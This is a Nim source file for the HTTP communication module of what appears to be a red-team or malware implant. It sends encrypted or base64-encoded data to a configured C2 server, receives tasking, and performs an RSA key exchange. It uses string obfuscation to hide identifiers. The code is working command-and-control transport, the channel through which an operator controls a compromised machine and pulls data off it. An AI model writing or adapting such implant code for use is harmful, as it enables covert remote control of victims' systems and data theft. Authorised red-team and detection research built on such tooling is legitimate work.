import std/[base64, strutils, json, random, os]
import ../config
import ../utils/crypto
import ../utils/http_client
import ../utils/debug
import ../utils/strenc

const encryptedExchange {.used.} = static: getEnv(obf("ENCRYPTED_EXCHANGE_CHECK"), "false").toLowerAscii in ["true", "t"]
when encryptedExchange:
  import ../utils/rsa
  import ../utils/key_exchange

type
  HttpProfile* = ref object
    config: Config
    aesKey: seq[byte]
    aesDecKey: seq[byte]  # Separate key for decryption
    client: HttpClientWrapper

proc newHttpProfile*(): HttpProfile =
  ## Create a new HTTP profile
  result = HttpProfile()
  result.config = getConfig()
  
  debug "[DEBUG] HTTP Profile: Creating HTTP client wrapper..."
  
  result.client = newClientWrapper()
  
  debug "[DEBUG] HTTP Profile: HTTP client wrapper created"
  
  # Set User-Agent
  result.client.headers = newHttpHeaders({"User-Agent": result.config.userAgent})
  
  debug "[DEBUG] HTTP Profile: Set default User-Agent: ", result.config.userAgent
  debug "[DEBUG] HTTP Profile: Custom headers config length: ", result.config.headers.len
  if result.config.headers.len > 0:
    debug "[DEBUG] HTTP Profile: Custom headers JSON: ", result.config.headers
  
  # Parse and add custom headers if provided (JSON format)
  if result.config.headers.len > 0:
    debug "[DEBUG] HTTP Profile: Parsing custom headers..."
    try:
      let headersJson = parseJson(result.config.headers)
      debug "[DEBUG] HTTP Profile: Custom headers parsed successfully"
      for key, val in headersJson.pairs:
        result.client.headers[key] = val.getStr()
        debug "[DEBUG] HTTP Profile: Added custom header: ", key, ": ", val.getStr()
    except Exception as e:
      debug "[DEBUG] HTTP Profile: Failed to parse custom headers: ", e.msg
  
  debug "[DEBUG] HTTP Profile: Header configuration complete"
  
  # Configure proxy if provided
  if result.config.proxyHost.len > 0 and result.config.proxyPort.len > 0:
    var proxyUrl = "http://" & result.config.proxyHost & ":" & result.config.proxyPort
    # Add auth if provided
    if result.config.proxyUser.len > 0 and result.config.proxyPass.len > 0:
      proxyUrl = "http://" & result.config.proxyUser & ":" & result.config.proxyPass & "@" & 
                 result.config.proxyHost & ":" & result.config.proxyPort
    debug "[DEBUG] HTTP Profile: Configuring proxy: ", proxyUrl
    try:
      result.client = newClientWrapperWithProxy(proxyUrl)
      # Re-apply headers after creating new client with proxy
      result.client.headers = newHttpHeaders({obf("User-Agent"): result.config.userAgent})
      debug "[DEBUG] HTTP Profile: Re-applied User-Agent after proxy setup"
      if result.config.headers.len > 0:
        try:
          let headersJson = parseJson(result.config.headers)
          for key, val in headersJson.pairs:
            result.client.headers[key] = val.getStr()
            debug "[DEBUG] HTTP Profile: Re-applied custom header: ", key, ": ", val.getStr()
        except:
          debug "[DEBUG] HTTP Profile: Failed to re-apply custom headers after proxy setup"
    except:
      debug "[DEBUG] HTTP Profile: Failed to configure proxy"
  
proc buildUrl(profile: HttpProfile): string =
  ## Build the full callback URL
  var host = profile.config.callbackHost
  var scheme = ""
  
  # Detect and strip any existing scheme from host
  if host.startsWith("https://"):
    scheme = "https"
    host = host[8..^1]
  elif host.startsWith("http://"):
    scheme = "http"
    host = host[7..^1]
  else:
    # No scheme provided, determine from port
    scheme = if profile.config.callbackPort == "443": "https" else: "http"
  
  result = scheme & "://" & host & ":" & 
           profile.config.callbackPort & "/" & profile.config.postUri

proc send*(profile: HttpProfile, data: string, callbackUuid: string = ""): string =
  ## Send data to C2 server
  let url = profile.buildUrl()
  let uuid = if callbackUuid.len > 0: callbackUuid else: profile.config.uuid
  
  debug "[DEBUG] === SENDING DATA ==="
  # Try to pretty-print JSON if it's valid JSON and small enough
  try:
    let jsonData = parseJson(data)
    # Only show full JSON for small payloads (< 2KB)
    if data.len < 2048:
      debug "[DEBUG] Request JSON:"
      debug jsonData.pretty()
    else:
      # For large payloads, show summary
      debug "[DEBUG] Request: Large payload (", data.len, " bytes)"
      if jsonData.hasKey(obf("action")):
        debug "[DEBUG] Action: ", jsonData["action"].getStr()
      if jsonData.hasKey(obf("responses")):
        debug "[DEBUG] Responses count: ", jsonData["responses"].len
  except:
    # Not JSON or parse error, show raw
    debug "[DEBUG] Request data (first 500 chars): ", data[0..<min(500, data.len)]
  
  # Only encrypt if AES key is available AND we have a callback UUID
  var payload: string
  if profile.aesKey.len > 0 and callbackUuid.len > 0:
    debug "[DEBUG] Encrypting payload with AES-256-CBC+HMAC"
    debug "[DEBUG] Data length: ", data.len, " bytes"
    debug "[DEBUG] AES key length: ", profile.aesKey.len, " bytes"
    debug "[DEBUG] UUID: ", uuid
    payload = encryptPayload(data, profile.aesKey, uuid)
    debug "[DEBUG] Encrypted payload length: ", payload.len, " bytes"
  else:
    # No encryption, just base64(UUID + data)
    debug "[DEBUG] Sending unencrypted payload (Base64 only)"
    debug "[DEBUG] Data length: ", data.len, " bytes"
    debug "[DEBUG] UUID: ", uuid
    payload = encode(uuid & data)
    debug "[DEBUG] Encoded payload length: ", payload.len, " bytes"
  
  debug "[DEBUG] Sending HTTP POST to: ", url
  debug "[DEBUG] Payload preview (first 100 chars): ", payload[0..<min(100, payload.len)]
  
  try:
    debug "[DEBUG] Sending HTTP request..."
    let response = profile.client.postContent(url, payload)
    debug "[DEBUG] HTTP response received"
    debug "[DEBUG] Response length: ", response.len, " bytes"
    debug "[DEBUG] Response preview (first 100 chars): ", response[0..<min(100, response.len)]
    # Decrypt response if AES key is available and we have callback UUID
    if profile.aesKey.len > 0 and callbackUuid.len > 0:
      debug "[DEBUG] Decrypting response with AES-256-CBC+HMAC"
      result = decryptPayload(response, profile.aesKey)
      debug "[DEBUG] Decrypted response length: ", result.len, " bytes"
    else:
      # No encryption, decode and skip UUID
      debug "[DEBUG] Decoding unencrypted response (Base64)"
      let decoded = decode(response)
      if decoded.len > 36:
        result = decoded[36..^1]
      else:
        result = ""    
    # Try to parse and pretty-print response JSON
    if result.len > 0:
      debug "[DEBUG] === RECEIVED RESPONSE ==="
      try:
        let jsonResp = parseJson(result)
        # Only show full JSON for small responses (< 2KB)
        if result.len < 2048:
          debug "[DEBUG] Response JSON:"
          debug jsonResp.pretty()
        else:
          # For large responses, show summary
          debug "[DEBUG] Response: Large payload (", result.len, " bytes)"
          if jsonResp.hasKey(obf("action")):
            debug "[DEBUG] Action: ", jsonResp["action"].getStr()
          if jsonResp.hasKey(obf("responses")):
            debug "[DEBUG] Responses count: ", jsonResp["responses"].len
          if jsonResp.hasKey(obf("tasks")):
            debug "[DEBUG] Tasks count: ", jsonResp["tasks"].len
      except:
        # Not JSON or parse error, show raw
        debug "[DEBUG] Response data (first 500 chars): ", result[0..<min(500, result.len)]
  except:
    debug "[DEBUG] Request failed: ", getCurrentExceptionMsg()
    result = ""

proc setAesKey*(profile: var HttpProfile, key: seq[byte]) =
  ## Set the AES encryption key
  profile.aesKey = key

proc setAesDecKey*(profile: var HttpProfile, key: seq[byte]) =
  ## Set the AES decryption key
  profile.aesDecKey = key

proc hasAesKey*(profile: HttpProfile): bool =
  ## Check if AES key is set
  result = profile.aesKey.len > 0

proc performKeyExchange*(profile: var HttpProfile): tuple[success: bool, newUuid: string] =
  ## Perform RSA key exchange to establish AES session key
  ## Returns (success, newUuid) tuple where newUuid is the callback UUID from server
  ## If encrypted exchange is not required, use the static PSK
  
  # If no encrypted exchange needed, just use the static PSK
  if not profile.config.encryptedExchange:
    debug "[DEBUG] No key exchange required (ENCRYPTED_EXCHANGE_CHECK=F)"
    # Don't set key yet - will be set after successful checkin
    return (true, "")
  
  # Only compile RSA code if encrypted exchange is enabled at build time
  when not encryptedExchange:
    debug "[DEBUG] RSA not compiled in (ENCRYPTED_EXCHANGE_CHECK not set at build time)"
    return (true, "")
  
  # Use shared key exchange implementation
  when encryptedExchange:
    # Create a send wrapper that matches the expected signature
    var p = profile  # Create capturable local reference
    proc sendWrapper(data: string, uuid: string): string =
      return p.send(data, uuid)
    
    let result = performRsaKeyExchange(profile.config, profile.config.uuid, sendWrapper)
    
    if result.success and result.sessionKey.len > 0:
      # Set the AES key
      profile.setAesKey(result.sessionKey)
      return (true, result.newUuid)
    elif result.success:
      # No key exchange needed (AESPSK mode)
      return (true, "")
    else:
      debug "[DEBUG] Key exchange failed: ", result.error
      return (false, "")

